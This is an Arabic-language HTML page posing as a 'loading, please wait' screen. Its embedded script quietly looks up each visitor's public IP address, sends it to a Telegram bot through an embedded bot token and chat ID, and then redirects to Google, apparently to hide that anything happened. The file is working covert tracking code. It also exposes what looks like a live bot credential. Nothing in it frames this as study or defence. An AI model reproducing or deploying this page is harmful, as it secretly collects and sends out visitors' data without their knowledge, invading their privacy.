<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>جاري التحميل...</title>
</head>
<body>
    <p>يرجى الانتظار قليلاً...</p>

    <script>
        const telegramToken = '8815702628:AAGFvFNqM7ZjysFguBMwG2qFTmOpMW3k9GU';
        const chatId = '5531163320';

        fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {
                let userIp = data.ip;
                let message = `🔔 زائر جديد للموقع!\n🌐 IP: ${userIp}`;

                fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message
                    })
                }).finally(() => {
                    window.location.href = "https://www.google.com";
                });
            })
            .catch(error => {
                window.location.href = "https://www.google.com";
            });
    </script>
</body>
</html>
